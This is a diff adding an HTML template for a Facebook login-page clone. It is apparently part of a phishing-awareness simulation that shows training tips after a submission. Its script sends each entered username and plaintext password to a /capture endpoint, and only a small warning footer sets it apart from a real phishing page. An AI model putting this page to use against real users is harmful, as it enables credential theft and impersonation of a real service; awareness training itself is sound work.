@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook - Log In or Sign Up</title>
+<style>
+* {{ margin: 0; padding: 0; box-sizing: border-box; }}
+body {{
+    font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+    background-color: #f0f2f5;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}}
+.edu-banner {{
+    background: #ff3d00;
+    color: #fff;
+    width: 100%;
+    text-align: center;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 700;
+    position: fixed;
+    top: 0;
+    z-index: 999;
+    box-shadow: 0 2px 12px rgba(255,61,0,0.5);
+}}
+.container {{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex: 1;
+    padding: 20px;
+    margin-top: 50px;
+}}
+.left-section {{
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    padding-right: 32px;
+    max-width: 500px;
+}}
+.logo {{
+    color: #1877f2;
+    font-size: 60px;
+    font-weight: bold;
+    margin-bottom: 10px;
+    letter-spacing: -2px;
+}}
+.tagline {{
+    font-size: 28px;
+    line-height: 32px;
+    color: #1c1e21;
+    font-weight: normal;
+}}
+.right-section {{
+    width: 100%;
+    max-width: 396px;
+}}
+.login-form {{
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+    padding: 20px;
+    margin-bottom: 28px;
+}}
+.login-form input {{
+    width: 100%;
+    padding: 14px 16px;
+    margin-bottom: 12px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    font-size: 17px;
+    line-height: 16px;
+    outline: none;
+}}
+.login-form input:focus {{
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px #e7f3ff;
+}}
+.login-btn {{
+    width: 100%;
+    background-color: #1877f2;
+    border: none;
+    border-radius: 6px;
+    color: #fff;
+    font-size: 20px;
+    font-weight: bold;
+    padding: 12px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}}
+.login-btn:hover {{
+    background-color: #166fe5;
+}}
+.forgot-password {{
+    text-align: center;
+    margin-bottom: 20px;
+}}
+.forgot-password a {{
+    color: #1877f2;
+    font-size: 14px;
+    text-decoration: none;
+}}
+.divider {{
+    border-bottom: 1px solid #dadde1;
+    margin: 20px 0;
+}}
+.create-btn {{
+    display: block;
+    width: fit-content;
+    margin: 0 auto;
+    background-color: #42b72a;
+    border: none;
+    border-radius: 6px;
+    color: #fff;
+    font-size: 17px;
+    font-weight: bold;
+    padding: 12px 16px;
+    cursor: pointer;
+}}
+.warning-footer {{
+    background: #fff3cd;
+    border: 1px solid #ffc107;
+    border-radius: 6px;
+    padding: 12px;
+    margin-top: 10px;
+    font-size: 13px;
+    color: #856404;
+    text-align: center;
+}}
+.hidden {{ display: none; }}
+.awareness-screen {{
+    background: #fff;
+    border-radius: 8px;
+    padding: 30px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, .1);
+    text-align: center;
+}}
+.awareness-screen h2 {{ color: #ff9100; margin-bottom: 16px; }}
+.awareness-screen ul {{
+    text-align: left;
+    margin: 16px auto;
+    max-width: 400px;
+    line-height: 2;
+}}
+.indicator {{
+    background: rgba(255,145,0,0.1);
+    border: 1px solid #ff9100;
+    border-radius: 8px;
+    padding: 14px;
+    margin-top: 16px;
+    font-size: 13px;
+}}
+@media (max-width: 900px) {{
+    .container {{ flex-direction: column; padding-top: 60px; }}
+    .left-section {{ text-align: center; padding-right: 0; margin-bottom: 40px; }}
+}}
+</style>
+</head>
+<body>
+ 
+
+<div class="container" id="loginContainer">
+    <div class="left-section">
+        <div class="logo">facebook</div>
+        <h2 class="tagline">Connect with friends and the world around you on Facebook.</h2>
+    </div>
+    <div class="right-section">
+        <form class="login-form" id="simForm" onsubmit="showAwareness(event)">
+            <input type="text" id="email" placeholder="Email or phone number" autocomplete="off" required>
+            <input type="password" id="password" placeholder="Password" autocomplete="off" required>
+            <button type="submit" class="login-btn">Log In</button>
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+            <div class="divider"></div>
+            <button type="button" class="create-btn">Create new account</button>
+        </form>
+        <div class="warning-footer">
+            ⚠️ This is a phishing simulation for training purposes
+        </div>
+    </div>
+</div>
+
+<div class="container hidden" id="awareness">
+    <div class="awareness-screen">
+        <h2>🛡️ You've Been Phished (Simulated!)</h2>
+        <p style="margin:12px 0;">
+            In a real attack, your credentials would now be in the attacker's hands.
+            Your entered credentials have been captured for this demonstration.
+        </p>
+        <ul>
+            <li>🔗 Check the URL — does it match facebook.com?</li>
+            <li>🔒 Verify HTTPS and the certificate issuer</li>
+            <li>📧 Did you arrive here via an unexpected email?</li>
+            <li>🔤 Watch for misspellings like facebo0k.com</li>
+            <li>🎨 Compare colors and layout to the real site</li>
+        </ul>
+        <div class="indicator">
+            <strong>Phishing indicators on this page:</strong><br>
+            {indicators}
+        </div>
+    </div>
+</div>
+
+<script>
+function showAwareness(e) {{
+  e.preventDefault();
+  const username = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  
+  if (username && password) {{
+    fetch('/capture', {{
+      method: 'POST',
+      headers: {{ 'Content-Type': 'application/json' }},
+      body: JSON.stringify({{
+        username: username,
+        password: password,
+        preset: '{preset_key}'
+      }})
+    }}).catch(err => console.log('Capture endpoint unavailable'));
+  }}
+  
+  document.querySelectorAll('input').forEach(i => i.value = '');
+  document.getElementById('loginContainer').classList.add('hidden');
+  document.getElementById('awareness').classList.remove('hidden');
+}}
+</script>
+</body>
+</html>
